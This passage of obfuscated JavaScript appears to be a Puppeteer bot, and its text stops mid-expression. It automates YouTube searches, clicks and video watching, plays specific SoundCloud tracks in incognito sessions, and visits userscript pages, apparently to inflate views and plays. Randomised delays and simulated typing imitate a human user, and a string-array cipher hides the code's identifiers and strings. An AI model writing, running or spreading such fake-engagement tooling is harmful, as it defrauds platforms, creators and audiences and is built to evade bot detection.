const a1 = c,
  a0 = d,
  Z = b;

function getRandomInt(f, h) {
  const i = ceil(f);
  return floor(random() * (floor(h) - i + (-0x1 * -0x91d + -0x1471 + 0xb55))) + i;
}
async function createPage(f, h) {
  let i = await f['newPage']();
  return await i['setDefault' + 'Navigation' + 'Timeout'](0x5 * -0x5ad + -0x2218 + 0x6f1 * 0x9), await i['goto'](h, {
    'waitUntil': ['domcontent' + 'loaded'],
    'timeout': 0x0
  }), i;
}
async function standardGoto(f, h, i) {
  return await f['goto'](h, {
    'waitUntil': ['domcontent' + 'loaded'],
    'timeout': 0x0
  }), i ? await wait(-0x84bc + 0xd6e1 + 0x230b + (-0x1993 * 0x3 + 0x256e + -0x61e3 * -0x1) * random()) : await standardWaitForNetIdle(f), await wait(-0x1 * -0x287 + 0x1f03 + -0x701 * 0x2 + (0x5 * 0xdbe + 0xc95 * 0x1 + -0x13 * 0x239) * random()), -0x2c5 * 0xb + 0x69e + 0x8e * 0x2b;
}

function c(b, d) {
  const e = a();
  return c = function(f, g) {
    f = f - (-0x21dc + 0x233b + -0x15f);
    let h = e[f];
    if (c['XawATu'] === undefined) {
      var i = function(m) {
        const n = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let o = '',
          p = '';
        for (let q = 0x31 * -0x47 + -0x7 * -0x3fd + -0xe54, r, s, t = -0x1f14 + 0x850 + -0x2f * -0x7c; s = m['charAt'](t++); ~s && (r = q % (-0x1 * -0x91d + -0x1471 + 0xb58) ? r * (0x5 * -0x5ad + -0x2218 + 0x3eb9 * 0x1) + s : s, q++ % (-0x1620 + 0x23d0 + -0xdac)) ? o += String['fromCharCode'](-0x1993 * 0x1 + 0xc7a + -0x386 * -0x4 & r >> (-(-0x1 * -0x287 + 0x1f03 + -0x431 * 0x8) * q & 0x5 * 0x6df + 0x219 * 0x3 + -0x28 * 0x104)) : -0x2c5 * 0xb + 0x69e + 0x197 * 0xf) {
          s = n['indexOf'](s);
        }
        for (let u = 0x48b * -0x1 + -0x1b7b + 0x2006, v = o['length']; u < v; u++) {
          p += '%' + ('00' + o['charCodeAt'](u)['toString'](-0x11c0 + -0x194 * -0x6 + 0x2 * 0x42c))['slice'](-(0xda4 + 0xb * 0x209 + 0x2405 * -0x1));
        }
        return decodeURIComponent(p);
      };
      c['lfbVwp'] = i, b = arguments, c['XawATu'] = !![];
    }
    const j = e[-0x2209 + -0x16 + 0x5 * 0x6d3],
      k = f + j,
      l = b[k];
    return !l ? (h = c['lfbVwp'](h), b[k] = h) : h = l, h;
  }, c(b, d);
}
async function standardWaitForNetIdle(f) {
  return await wait(0x48b * -0x1 + -0x1b7b + 0x338e), await f['waitForNet' + 'workIdle']({
    'idleTime': 0x1d4c,
    'timeout': 0x0
  }), -0x11c0 + -0x194 * -0x6 + 0x1 * 0x849;
}

function a() {
  const bq = [
    'QvNNCQ-8Rp',
    'iWJdNmopWPX2W5r9qMa',
    'lM9YzW',
    'W644W5m8',
    'BwLU',
    'zxzHBhvHDgu',
    'FJJdVCoaWRisWQGyeGS',
    'BMTOA3HlvuHZwq',
    'BmkDpSk8W6tcNCooshxdQG',
    'lwL0C2vSzI0ZyG',
    'slice',
    'pts/by-sit',
    'jCogoSo0W5ncW48mWQLf',
    'B2nLC3mUlI4',
    'amkKW7ZdRCk+xbG7WP3dPW',
    'WPK8w8oKsry',
    'WRVdNmkjlCkHA0ZdNmk6W7u',
    'wxHXyMTnAtfjCW',
    'random',
    'setAttribu',
    'zxjdB250zxH0',
    'enuserjs.o',
    'eader-arro',
    'W5/cM1LlW6LuWQ3dKNzr',
    'CNrLCL9YzxnVDq',
    'o\x20healers,',
    'ap-2022-76',
    'DSkhW611p2P2guVcKW',
    'q8oKWPjIW6DWW5xcGatcLW'
  ];
  a = function() {
    return bq;
  };
  return a();
}
async function randomWait() {
  return await wait(0xda4 + 0xb * 0x209 + 0x107f * -0x1 + (-0x2209 + -0x16 + 0x43 * 0xcd) * random()), 0xe26 + -0x71d + 0x384 * -0x2;
}
async function watchRandomFrontScreenVideo(f) {
  await f['evaluate'](() => {
    const R = d;
    var i;
    (i = Array['from'](document['getElement' + 'sByClassNa' + 'me']('yt-core-im' + 'age--fill-' + 'parent-hei' + 'ght\x20yt-cor' + 'e-image--f' + 'ill-parent' + '-width\x20yt-' + 'core-image' + '\x20yt-core-i' + 'mage--cont' + 'ent-mode-s' + 'cale-aspec' + 't-fill\x20yt-' + 'core-image' + '--loaded'))['slice'](0xdb0 + -0x419 + -0x997, 0x9b3 + -0x1275 + 0x8c9), i[Math['floor'](Math[R(0x12)]() * i['length'])])['setAttribu' + 'te']('id', '__scope');
  }), await randomWait(), await f['click']('#__scope'), await standardWaitForNetIdle(f);
  const h = await getMaxTime(f);
  return await wait(Math['min']((0x5db9 + -0x939 * 0x1d + -0x1981c * -0x1) * getRandomInt(-0x8ed + -0x19d2 + -0xd9 * -0x29, 0x2cf * 0x1 + 0x22e2 + -0x25ac * 0x1), h)), -0x2371 * 0x1 + -0x87c + 0x1 * 0x2bee;
}
async function getMaxTime(f) {
  return await f['evaluate'](() => {
    const S = b,
      h = {
        'Seconds': 0x3e8,
        'Minutes': 0xea60,
        'Hours': 0x36ee80,
        'Second': 0x3e8,
        'Minute': 0xea60,
        'Hour': 0x36ee80
      };
    let i = Array[S(0x3, 'Kh^g')](document['getElement' + 'sByClassNa' + 'me']('ytp-progre' + 'ss-bar'))['pop']()['ariaValueT' + 'ext'],
      j = -0x1d88 + -0x1b9 + -0x3f * -0x7f;
    i = i['split'](i['includes']('of') ? '\x20of\x20' : ',\x20')[-0x255d + -0x2 * -0x68e + 0x1842]['split']('\x20');
    for (let k = -0x83b + -0x1b9 * -0xf + -0x119c; k < i['length']; k += -0x168c + 0x1f * -0x1b + -0x259 * -0xb)
      j += i[k] * h[i[k + (0xa98 + -0x118 * -0x1b + -0x281f)]];
    return j;
  });
}
async function anchorAndView(f) {
  const T = c;
  log('goto\x20chann' + 'el\x20and\x20vie' + 'w\x20video\x20pr' + T(0xd)), await standardGoto(f, channels['random']()), await f['click']('tp-yt-pape' + 'r-tab.styl' + 'e-scope:nt' + 'h-child(4)' + '\x20>\x20div:nth' + '-child(1)'), log('clicked\x20vi' + 'deo\x20stuff'), await standardWaitForNetIdle(f), log('page\x20netwo' + 'rk\x20idle\x20x2'), await f['evaluate'](() => {
    const U = d,
      j = Array['from'](document['querySelec' + 'torAll']('#contents'))['filter'](l => 'style-scop' + 'e\x20ytd-rich' + '-grid-row' == l['getAttribu' + 'te']('class'))[U(0xa)](0x2 * -0x713 + 0x32f + 0xafd)['map'](l => Array['from'](l['children']))['flat'](-0x56e * -0x2 + 0xaf7 + 0x18f * -0xe)['map'](l => l['childNodes'][-0x9 * 0x126 + 0x4 * 0x121 + -0x1 * -0x5d3]['childNodes'][-0x20ff + 0x1e + 0x20e1]['childNodes'][0x26e9 * 0x1 + 0x21d1 + -0x1 * 0x48b9]['childNodes'][0x29 * 0xc7 + -0x25a3 + 0x5c4]['childNodes'][-0x17e2 + 0x23c * -0x4 + 0x20d3]);
    var k;
    return (k = j)[Math['floor'](Math['random']() * k['length'])]['setAttribu' + 'te']('id', '__hookedVi' + 'dToWatch'), j['map'](l => l['href']);
  }), await wait(getRandomInt(0x1 * -0x2691 + 0x1139 * 0x2 + 0x807, 0x108c + -0xf7f * 0x1 + 0x1 * 0x127b)), await f['click']('#__hookedV' + 'idToWatch'), await wait(-0xc4 * -0x7d + -0xf09 + 0x1 * -0x1613);
  const h = await getMaxTime(f),
    i = Math['min']((-0x5 * -0x11f + -0xbb8a + -0x3f7 * -0x69) * getRandomInt(0x26f8 + -0x1f5b + -0x79b, 0x22aa + -0x1241 + -0x1064), h);
  return await wait(i), -0x2397 + -0x1b91 * -0x1 + 0x5 * 0x19b;
}

function b(c, d) {
  const e = a();
  return b = function(f, g) {
    f = f - (-0x21dc + 0x233b + -0x15f);
    let h = e[f];
    if (b['caeYos'] === undefined) {
      var i = function(n) {
        const o = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let p = '',
          q = '';
        for (let r = 0x31 * -0x47 + -0x7 * -0x3fd + -0xe54, s, t, u = -0x1f14 + 0x850 + -0x2f * -0x7c; t = n['charAt'](u++); ~t && (s = r % (-0x1 * -0x91d + -0x1471 + 0xb58) ? s * (0x5 * -0x5ad + -0x2218 + 0x3eb9 * 0x1) + t : t, r++ % (-0x1620 + 0x23d0 + -0xdac)) ? p += String['fromCharCode'](-0x1993 * 0x1 + 0xc7a + -0x386 * -0x4 & s >> (-(-0x1 * -0x287 + 0x1f03 + -0x431 * 0x8) * r & 0x5 * 0x6df + 0x219 * 0x3 + -0x28 * 0x104)) : -0x2c5 * 0xb + 0x69e + 0x197 * 0xf) {
          t = o['indexOf'](t);
        }
        for (let v = 0x48b * -0x1 + -0x1b7b + 0x2006, w = p['length']; v < w; v++) {
          q += '%' + ('00' + p['charCodeAt'](v)['toString'](-0x11c0 + -0x194 * -0x6 + 0x2 * 0x42c))['slice'](-(0xda4 + 0xb * 0x209 + 0x2405 * -0x1));
        }
        return decodeURIComponent(q);
      };
      const m = function(n, o) {
        let p = [],
          q = -0x2209 + -0x16 + 0x5 * 0x6d3,
          r, t = '';
        n = i(n);
        let u;
        for (u = 0xe26 + -0x71d + 0x709 * -0x1; u < 0xdb0 + -0x419 + -0x897; u++) {
          p[u] = u;
        }
        for (u = 0x9b3 + -0x1275 + 0x8c2; u < 0x7d0 + -0x3b7 * 0x6 + -0xf7a * -0x1; u++) {
          q = (q + p[u] + o['charCodeAt'](u % o['length'])) % (-0x8ed + -0x19d2 + -0x23bf * -0x1), r = p[u], p[u] = p[q], p[q] = r;
        }
        u = 0x2cf * 0x1 + 0x22e2 + -0x25b1 * 0x1, q = -0x2371 * 0x1 + -0x87c + 0x1 * 0x2bed;
        for (let v = -0x1d88 + -0x1b9 + -0x3f * -0x7f; v < n['length']; v++) {
          u = (u + (-0x255d + -0x2 * -0x68e + 0x1842)) % (-0x83b + -0x1b9 * -0xf + -0x109c), q = (q + p[u]) % (-0x168c + 0x1f * -0x1b + -0x55d * -0x5), r = p[u], p[u] = p[q], p[q] = r, t += String['fromCharCode'](n['charCodeAt'](v) ^ p[(p[u] + p[q]) % (0xa98 + -0x118 * -0x1b + -0x2720)]);
        }
        return t;
      };
      b['FvCAEq'] = m, c = arguments, b['caeYos'] = !![];
    }
    const j = e[0x2 * -0x713 + 0x32f + 0xaf7],
      k = f + j,
      l = c[k];
    return !l ? (b['JXJmSx'] === undefined && (b['JXJmSx'] = !![]), h = b['FvCAEq'](h, g), c[k] = h) : h = l, h;
  }, b(c, d);
}
async function frontScreenActions(f) {
  return log('going\x20to\x20f' + 'ront\x20scree' + 'n\x20and\x20clic' + 'king\x20rando' + 'm\x20video...'), await standardWaitForNetIdle(f), await randomWait(), log('click\x20atte' + 'mpt...'), await f['evaluate'](() => {
    const V = b;
    var h;
    (h = Array['from'](document['getElement' + 'sByClassNa' + 'me']('style-scop' + 'e\x20ytd-rich' + '-grid-row'))['filter'](i => 'contents' != i['id']), h[Math['floor'](Math['random']() * h['length'])])['children'][-0x267f + 0x2f9 + -0x11c3 * -0x2]['children'][-0x2216 + -0xb7 * 0x1f + 0x383f]['children'][0x94d + 0x2a5 * 0x7 + -0x1bd0]['children'][0x2681 * -0x1 + 0x2f1 * -0x5 + 0x1a9b * 0x2]['children'][-0x12f0 * -0x1 + -0x258c + 0x6 * 0x31a]['setAttribu' + 'te']('id', V(0x8, 'n%9B'));
  }), await randomWait(), await f['click']('#gottemeze' + 'z'), await standardWaitForNetIdle(f), await watchRandomFrontScreenVideo(f), -0x1346 * -0x1 + -0x1799 + 0x454;
}
async function searchAndView(f) {
  const W = c;
  log('searching\x20' + 'youtube\x20re' + 'sults'), await randomWait(), await f['evaluate'](() => {
    let j = Array['from'](document['querySelec' + 'torAll']('#search'));
    document['getElement' + 'ById']('__searchBo' + 'xReal') || j['find'](k => 'INPUT' === k['tagName'])['setAttribu' + 'te']('id', '__searchBo' + 'xReal');
  }), await f['type']('#__searchB' + 'oxReal', searchTerms['random'](), {
    'delay': -0x607 * -0x2 + 0x25d4 + -0x23 * 0x16a + (0x21b2 * -0x1 + 0x491 * 0x1 + 0x1d53) * random()
  }), await wait(0x2281 + -0x3 * -0xa07 + -0x1 * 0x3ea2 + (0x21c6 + 0x8e + -0x2128) * random()), await f['click']('#search-ic' + 'on-legacy'), await async function j() {
    if (!await f['evaluate'](() => Array['from'](document['getElement' + 'sByTagName']('ytd-video-' + 'renderer'))['length']))
      return await j();
  }(), await standardWaitForNetIdle(f);
  let h = await f[W(0x5)](() => {
    const k = {
        'seconds': 0x3e8,
        'minutes': 0xea60,
        'hours': 0x36ee80,
        'second': 0x3e8,
        'minute': 0xea60,
        'hour': 0x36ee80
      },
      l = (m = Array['from'](document['getElement' + 'sByTagName']('ytd-video-' + 'renderer'))['map'](p => p['childNodes'][0x198c + 0x423 + -0x1dad]['childNodes'][0x38c + -0x209c + 0x1d11]['childNodes'][-0x1057 + 0x11c4 + 0x5b * -0x4]))[Math['floor'](Math['random']() * m['length'])];
    var m;
    const n = l['childNodes'][-0x26 * -0xbd + -0x2 * -0x3d3 + 0x261 * -0xf]['childNodes'][0x1 * 0xbfe + 0x1 * -0x2650 + 0x1a52]['childNodes'][0xb99 * 0x1 + -0x256c + 0x19d5 * 0x1]['ariaLabel'];
    return l['setAttribu' + 'te']('id', '__hookedVi' + 'dToClick'), l['scrollInto' + 'View'](),
      function(p) {
        let q = p['split'](',\x20')['map'](u => u['split']('\x20'))['flat'](-0xf4f + 0x4a + 0x3 * 0x502),
          r = 0xd * -0x235 + 0x1c27 + 0x8a;
        for (let u = 0x2d * -0xb4 + 0x198 * 0x17 + -0x504; u < q['length']; u += -0x40 * -0x8b + 0x1c5d + -0x3f1b)
          r += q[u] * k[q[u + (-0x4 * -0x26b + 0x1 * -0xbf3 + 0x248)]];
        return r;
      }(n);
  });
  await wait((-0x1 * 0x455d + 0x1 * 0x836 + 0x17f3 * 0x5) * Math['random']()), await f['click']('#__hookedV' + 'idToClick');
  let i = Math[W(0x4)]((0x13ac * 0x15 + 0x1c10 + -0xa * 0x14ae) * getRandomInt(0x721 + -0x155b + 0xe3b, 0xef + -0x1f1a + -0x1e35 * -0x1), h + (-0x13 * 0x9b + 0x24f6 + -0x29 * 0x25));
  return await wait(i), -0xa8d + -0x65 * -0x4b + -0x1309;
}
async function keyWatch(f) {
  log('standard\x20k' + 'eyWatch...'), await standardGoto(f, 'https://ww' + 'w.youtube.' + 'com/watch?' + 'v=' + hookPlaylistPoints['random']() + ('&list=PL7D' + '9Ps0wVt5cy' + 'nwDE_CPYb6' + 'aBUkYyfi-y'), 0xf11 + 0x3 * -0xa57 + 0xff4), log('clicking..' + '.'), await f['click']('#button\x20>\x20' + 'ytd-button' + '-renderer\x20' + '>\x20yt-butto' + 'n-shape\x20>\x20' + 'button\x20>\x20y' + 't-touch-fe' + 'edback-sha' + 'pe\x20>\x20div\x20>' + '\x20div.yt-sp' + 'ec-touch-f' + 'eedback-sh' + 'ape__fill'), await f['click']('#top-level' + '-buttons-c' + 'omputed\x20>\x20' + 'ytd-toggle' + '-button-re' + 'nderer\x20>\x20y' + 't-button-s' + 'hape\x20>\x20but' + 'ton\x20>\x20yt-t' + 'ouch-feedb' + 'ack-shape\x20' + '>\x20div\x20>\x20di' + 'v.yt-spec-' + 'touch-feed' + 'back-shape' + '__fill');
  const h = setInterval(async () => {
    log('executed\x20c' + 'leanup\x20int' + 'erval,\x20che' + 'ck\x20process' + '...'), await f['evaluate'](() => {
      setTimeout(() => {
        const X = d;
        document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on')?.['offsetPare' + 'nt'] && document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on')[X(0x13) + 'te']('id', '__lllll');
      }, -0x246e + 0x18de + 0x1748 + (-0x1dae + -0x13 * -0x7b + -0x1 * -0x1875) * Math['random']());
    });
  }, 0x3 * -0x8df + 0x2f3b + 0x6ba);
  await wait(0x2051f * -0x3 + -0x1d * -0x259 + -0x52f94 * -0x2);
  try {
    await f['click']('#__lllll');
  } catch (i) {}
  return await wait((0xa68e + 0x19a8c + -0x829 * 0x2a) * getRandomInt(-0x1dac + 0x1 * -0x2eb + 0x209b, 0x16 * -0x64 + -0x246c + 0x2d1d)), clearInterval(h), 0x1 * -0x2b6 + 0x269a + -0x23e3;
}
async function runYTModule(f, h) {
  const i = await createPage(f, 'https://ww' + 'w.youtube.' + 'com/');
  for (await randomWait();;) {
    let j = -0xa0 * -0x35 + 0x301 * 0x4 + -0x2d24;
    try {
      await standardWaitForNetIdle(i), await GlobalActions['random']()(i);
    } catch (k) {
      i['close']();
    }
    if (j)
      return -0xe1b * -0x1 + 0x2e * -0x1c + -0x912;
    await randomWait();
  }
  return 0x1 * 0x15ae + -0x13 * 0x14d + 0x30a;
}

function fetchRandomSC() {
  return Math['random']() <= 0x16e6 + 0x146 + 0x374 * -0x7 + 0.5 ? 'https://so' + 'undcloud.c' + 'om/22down/' + 'long-day-r' + 'emix-prod-' + 'unnecessar' + 'y-beats?si' + '=30458c9ce' + '44c4b4eaab' + '8a3eca1b3a' + '58e&utm_so' + 'urce=clipb' + 'oard&utm_m' + 'edium=text' + '&utm_campa' + 'ign=social' + '_sharing' : Math['random']() < -0x26e + 0xa * -0x283 + 0x1b8c + 0.2 ? 'https://so' + 'undcloud.c' + 'om/22down/' + 'whatnot-de' + 'mo?si=cf08' + 'c07128594b' + 'f6b3d049e1' + '680b972f&u' + 'tm_source=' + 'clipboard&' + 'utm_medium' + '=text&utm_' + 'campaign=s' + 'ocial_shar' + 'ing' : 'https://so' + 'undcloud.c' + 'om/22down/' + 'worried-ab' + 'out-the-tr' + 'uth-ft-rik' + 'anbeastly-' + 'nikkkq-cas' + 'ualcheater' + '?si=20d1c3' + '32655b4ef1' + '98a379eac0' + '05725b&utm' + '_source=cl' + 'ipboard&ut' + 'm_medium=t' + 'ext&utm_ca' + 'mpaign=soc' + 'ial_sharin' + 'g';
}
async function runGFModule(f, h) {
  async function i() {
    if (doFlags['doSoundClo' + 'ud'] && Math['random']() >= 0x24ee + -0x31 * 0xe + -0x2 * 0x1120 + 0.3) {
      const j = await f['createInco' + 'gnitoBrows' + 'erContext'](),
        k = await j['newPage']();
      let l = -0x227c + -0x98 * -0x4 + -0x336 * -0xa;
      if (await k['goto'](fetchRandomSC(), {
          'timeout': NETWORK_PATIENCE
        })['catch'](m => l++), l)
        return await k['close'](), await j['close'](), i();
      try {
        const m = await k['evaluate'](() => {
          let n = document['querySelec' + 'tor']('#content\x20>' + '\x20div\x20>\x20div' + '.l-listen-' + 'hero\x20>\x20div' + '\x20>\x20div.ful' + 'lHero__for' + 'eground.fu' + 'llListenHe' + 'ro__foregr' + 'ound.sc-p-' + '4x\x20>\x20div.f' + 'ullHero__t' + 'itle\x20>\x20div' + '\x20>\x20div\x20>\x20d' + 'iv.soundTi' + 'tle__playB' + 'utton.soun' + 'dTitle__pl' + 'ayButtonHe' + 'ro.theme-l' + 'ight\x20>\x20a');
          n && 'Play' === n['textConten' + 't'] && n['click']();
        });
        await wait(0xbc9 + 0x8d19 + 0x6 * 0x3d1 + getRandomInt(0x1 * 0x27c1 + 0xc40 + 0x697, -0x7990 + 0xcd2b + 0x2195));
      } catch (n) {}
      return await k['close'](), await j['close'](), i();
    } {
      const {
        url: p,
        preRef: q
      } = scriptTargets['randomFlus' + 'h'](0xda4 + -0x1cf8 + 0x19 * 0x9d), r = await f['createInco' + 'gnitoBrows' + 'erContext'](), s = await r['newPage']();
      let u = 0x1d0a + -0x782 + -0x1588;
      if (await s['goto'](q, {
          'timeout': NETWORK_PATIENCE
        })['catch'](w => u++), u)
        return await s['close'](), await r['close'](), i();
      const v = await s['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
      return log(v['slice'](-0xd0 + 0x8ec + 0x2b4 * -0x3, -0x16 * -0x13 + 0x2348 + 0x8 * -0x497)), v['includes']('script-des' + 'cription') ? (log('p1'), await s['goto'](p, {
        'timeout': NETWORK_PATIENCE
      })['catch'](w => u++), u ? (await s['close'](), await r['close'](), i()) : (await new Promise(w => setTimeout(w, 0x1 * 0x1783 + -0x21 * 0xad + 0x69a + floor((-0x13 * -0xb5 + -0x193a + 0xfb3) * random()))), log('p2'), log(await s['evaluate'](() => {
        var w, x, y, z, A, B, C, D, E = 'object' == typeof window ? window : {},
          F = !E['JS_SHA1_NO' + '_NODE_JS'] && 'object' == typeof process && process['versions'] && process['versions']['node'];
        F && (E = global), w = ('0123456789' + 'abcdef')['split'](''), x = [
          -(-0xb6130132 + 0x13998fe6 + -0xb9e752c * -0x19),
          -0xa859f5 + 0xfb6 * 0x973 + 0x93e533,
          0x13 * -0x6a1 + 0xb36f + -0x12a1 * -0x4,
          0x2156 + 0x12fb + -0x33d1
        ], y = [
          -0x4d9 + 0x3 * -0x4dd + 0x14 * 0xfa,
          -0x26f3 + 0x4 * -0x77e + 0x44fb,
          -0x62 * -0x8 + 0x895 + -0xb9d,
          -0x1 * -0x1fc5 + -0x42 * -0x3d + -0x2f7f
        ], z = [
          'hex',
          'array',
          'digest',
          'arrayBuffe' + 'r'
        ], A = [], B = function(J) {
          return function(K) {
            return new G(0xe * -0x219 + -0x25e + -0x7d * -0x41)['update'](K)[J]();
          };
        }, C = function() {
          var J, K, L = B('hex');
          for (F && (L = D(L)), L['create'] = function() {
              return new G();
            }, L['update'] = function(M) {
              return L['create']()['update'](M);
            }, J = 0x617 * -0x3 + -0x9f7 + 0x1c3c; J < z['length']; ++J)
            K = z[J], L[K] = B(K);
          return L;
        }, D = function(J) {
          var K = eval('require(\'crypto\');'),
            L = eval('require(\'buffer\')[\'Buffer\'];'),
            M = function(N) {
              if ('string' == typeof N)
                return K['createHash']('sha1')['update'](N, 'utf8')['digest']('hex');
              if (N['constructo' + 'r'] === ArrayBuffer)
                N = new Uint8Array(N);
              else {
                if (void(0x4 * 0x4ca + -0x1947 + 0x61f) === N['length'])
                  return J(N);
              }
              return K['createHash']('sha1')['update'](new L(N))['digest']('hex');
            };
          return M;
        };
        class G {
          constructor(J) {
              J ? (A[0x207c + -0x21d1 + -0x1f * -0xb] = A[0x4c0 + 0x8f3 + 0x1 * -0xda3] = A[-0x39 * -0x10 + 0x1d5f + -0x20ee] = A[0x1647 + -0x15b5 * -0x1 + 0x362 * -0xd] = A[-0x1554 + -0xb7f + 0x9 * 0x3a6] = A[0x212e + 0x1 * 0x2302 + -0x442c] = A[0xa * -0x382 + -0x1 * 0x20da + 0x43f3] = A[-0x3 * -0x4b2 + 0x7 * -0x303 + -0x3 * -0x257] = A[0x1 * -0x102d + 0x1f67 + 0xf33 * -0x1] = A[-0x233 * -0xb + 0xbb5 + -0x11ef * 0x2] = A[-0x3 * 0x28f + 0x19 * 0x1d + 0x4e1] = A[0x2 * 0xdf3 + -0x23bc * -0x1 + -0x3f98] = A[-0x1ace + -0x199f + -0x1a3c * -0x2] = A[0x1f81 + -0x11 * 0xc2 + -0x1293] = A[-0x1e20 + -0x2103 + 0x151 * 0x30] = A[-0x3c * 0x17 + -0x13 * 0x1f6 + 0x2ab4] = A[-0x12 * 0xdc + 0x1 * 0x1381 + -0x3fa] = -0x14c * -0x6 + -0x3f1 * 0x7 + -0x1 * -0x13cf, this['blocks'] = A) : this['blocks'] = [
                0x11 * -0xa6 + -0x1 * 0x62 + 0xb68,
                -0x36 * -0xa6 + 0x20ff + -0x4403,
                0xe17 + 0x1282 + -0x5 * 0x685,
                0x1f9f + 0x121b + -0x31ba,
                0x1 * -0x37d + 0x23d6 + -0x2059,
                -0x11 * -0x16f + -0x1a * 0x141 + -0x2b * -0x31,
                -0x2016 + 0x2532 + -0x51c,
                0x185 * 0x1 + 0x16 * -0xbf + -0x5d * -0x29,
                0x311 * -0xa + -0xd8e + 0x2c38 * 0x1,
                0x253 + 0x11 * -0x1cf + 0x1c6c,
                -0x5 * -0x327 + -0x98f * -0x1 + -0x1 * 0x1952,
                -0x1b * 0xd + 0xc66 * 0x1 + -0xb07,
                -0x4f1 * 0x1 + 0xc5e + -0x76d,
                0x1dc3 + -0x1 * 0x502 + 0x1 * -0x18c1,
                0x12e7 + -0x6 * -0x665 + 0x1b * -0x21f,
                -0x2b7 * -0x3 + 0x20e1 * -0x1 + 0xc5e * 0x2,
                0xd3 * -0x2 + -0x1 * 0xca3 + -0xe49 * -0x1
              ], this['h0'] = -0x488f5769 + -0x9e4 * -0xbeabf + 0x39f6b14e, this['h1'] = 0x17aff40c2 + 0x7f13 * 0x2f2f7 + -0x201f2268e, this['h2'] = -0xc0045e3b + 0x1050110ad + 0x53be2a8c, this['h3'] = -0x1445e22 + -0xe * 0x1b878a7 + 0x1669 * 0x1daaa, this['h4'] = -0x2 * -0x587caa9f + -0x1 * -0xd040a959 + -0x1d9 * 0x66827f, this['block'] = this['start'] = this['bytes'] = this['hBytes'] = 0x1c2e + 0xc5f * 0x1 + -0x288d, this['finalized'] = this['hashed'] = 0x2402 + -0x3 * -0x884 + 0x3d8e * -0x1, this['first'] = 0x1061 + -0xa13 * -0x2 + 0x2486 * -0x1;
            }
            ['update'](J) {
              var K, L, M, N, O, P;
              if (!this['finalized']) {
                for ((K = 'string' != typeof J) && J['constructo' + 'r'] === E['ArrayBuffe' + 'r'] && (J = new Uint8Array(J)), M = 0x11ea + 0x3b * 0x7a + -0x2e08, O = J['length'] || 0x2676 + 0x2 * -0xa66 + 0x7 * -0x286, P = this['blocks']; M < O;) {
                  if (this['hashed'] && (this['hashed'] = -0x2699 + 0x16d9 + 0xfc0, P[-0x4d8 + 0x4e4 + -0x1 * 0xc] = this['block'], P[-0xe3 * 0x1 + -0x6fe + 0x7f1] = P[-0x202 + -0x13a5 * -0x1 + -0x11a2] = P[-0x16 * -0x82 + -0x232 * -0x6 + -0x26f * 0xa] = P[-0x8fe * 0x1 + -0x1 * 0x944 + 0x1245] = P[-0x19ca + -0x2066 + 0x3a34] = P[-0x38 * -0x8 + 0x1c96 + 0x255 * -0xd] = P[-0x1 * -0x716 + 0x1262 + -0x1972 * 0x1] = P[-0x1a94 + -0x1ad2 + 0x11cf * 0x3] = P[-0x1 * 0xa39 + 0x8b * -0x16 + -0x1633 * -0x1] = P[-0x20a4 + -0x2 * -0xbf2 + 0x1 * 0x8c9] = P[-0x2030 + -0x1a8 * 0x11 + 0x3c62] = P[0x9 * 0x35 + -0x40 * 0x44 + -0xf2e * -0x1] = P[-0x1ff5 + -0x6c * 0xb + 0x24a5] = P[-0x3e5 * -0xa + 0x73 * 0x53 + 0x2617 * -0x2] = P[0x26a8 + -0x224a + -0x4 * 0x114] = P[0x13 * -0x1ee + 0x49 * 0x23 + 0x1abe] = -0x2681 + 0x1 * -0x1c41 + 0x42c2), K) {
                    for (N = this['start']; M < O && N < 0x9a5 + 0x87d + -0x11e2; ++M)
                      P[N >> -0x14c0 + -0xca * 0x9 + 0x1bdc] |= J[M] << y[0x1893 + 0x11 * 0x88 + -0x2198 & N++];
                  } else {
                    for (N = this['start']; M < O && N < -0x21ae + -0xe * 0xad + -0x4 * -0xad9; ++M)
                      (L = J['charCodeAt'](M)) < 0x1 * 0x935 + -0x1915 * 0x1 + 0x4 * 0x418 ? P[N >> -0xb * -0x366 + 0x234e + -0x48ae] |= L << y[0x60c + 0x58a * 0x4 + 0x1 * -0x1c31 & N++] : L < 0xa92 + -0xb8a + 0x8f8 ? (P[N >> -0x1ae1 * -0x1 + -0x38d + -0x1752] |= (0xdd + -0x1187 + 0x8b5 * 0x2 | L >> -0x7b9 + 0x94 * -0x35 + 0x1 * 0x2663) << y[0x126 * -0x21 + -0x587 + 0x2b70 & N++], P[N >> -0xfb7 + -0x195 * 0x10 + 0x835 * 0x5] |= (-0x24c1 + -0x11 * 0x131 + -0x1b1 * -0x22 | 0x141b + -0xb * -0xfd + -0x1ebb * 0x1 & L) << y[-0x1 * -0x14aa + -0x1c4c * -0x1 + 0x1 * -0x30f3 & N++]) : L < -0x4 * -0x3743 + 0x18e05 + -0x19311 || L >= 0x13 * -0xa6 + 0x4c63 * 0x1 + 0x9fef ? (P[N >> -0x17b1 + 0xc50 * 0x3 + -0xd3d] |= (-0x654 + -0x9 * -0x1c2 + -0x89e | L >> -0x1868 + 0x610 + 0x4 * 0x499) << y[0x2503 + -0x13c * -0xb + -0x3294 & N++], P[N >> -0x1 * -0x920 + -0x115e + -0xb * -0xc0] |= (-0x1 * 0xf75 + -0x1c2c + -0x403 * -0xb | L >> 0x24a3 + -0x5 * 0x33d + -0x4 * 0x51b & -0x3 * -0x279 + -0x1369 * -0x1 + -0x551 * 0x5) << y[-0x1 * -0x1153 + 0x2 * 0xcbf + -0x1567 * 0x2 & N++], P[N >> 0xb75 * -0x1 + 0x1 * 0x14f6 + -0x97f] |= (-0x10db + -0x3d * -0x81 + -0xd62 | 0x851 * 0x3 + 0xe4e + -0x2702 & L) << y[-0x1908 + -0x4 * -0x93f + -0xbf1 & N++]) : (L = -0x30e9 * -0x1 + 0x1ca15 + -0xfafe + ((-0x7d7 * 0x2 + 0x2522 + -0x1175 & L) << -0x22ee + -0x1729 + -0x1 * -0x3a21 | 0xb3d * -0x3 + 0xb1 * 0x27 + 0x3 * 0x395 & J['charCodeAt'](++M)), P[N >> -0x823 * -0x1 + 0x191a + -0x2f * 0xb5] |= (-0xb3 * -0x16 + -0x17a6 + 0x934 | L >> -0x1b * -0x138 + -0x6bb * -0x1 + -0x2791) << y[0x1 * -0xeeb + -0x1199 + 0x2087 & 